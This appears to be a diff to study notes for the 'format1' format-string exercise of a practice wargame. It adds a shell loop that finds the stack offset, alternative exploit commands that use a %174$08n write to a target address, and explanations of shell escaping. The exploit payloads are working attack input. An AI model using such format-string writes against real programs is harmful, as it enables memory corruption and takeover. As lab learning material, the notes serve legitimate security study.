@@ -7,10 +7,16 @@
 
 manual test is time-consuming, we can use shell to help:
     for i in {1..300};do echo "trying offset $i - `./format1 DDDD%$i\\$08x`"; done | grep DDDD44444444   
+or
+    for i in {1..300};do echo "trying offset $i - $(./format1 DDDD%$i\$08x)"; done | grep DDDD44444444
 to get the offset(174)
+note: with $(),the whole thing between ( and ) is regarded as a single command, thus we just need one backslash to make sure $0 will not interpreted as shell name. while with ``, the whole thing between ` and ` will first be interpreted and then execute with shell ,thus we need two backslash.
 
 then use this offset to exploit
    ./format1 `python -c 'print("\x24\xa0\x04\x08")'`%174\$08n
+or
+   ./format1 `python -c 'print "\x24\xa0\x04\x08"+ "%174$08n"'`
+note: if we put the right half string in python print command, we don't need a backslash before $,because python treat is as a normal character. However, if we put the right half string in shell command line and concatenate it with the result of python print command, we need a backslash before $, because otherwise shell will inpterprete $ and the 0 after it as the name of the shell.
 
 format1.sh should be executed as
    . format1.sh
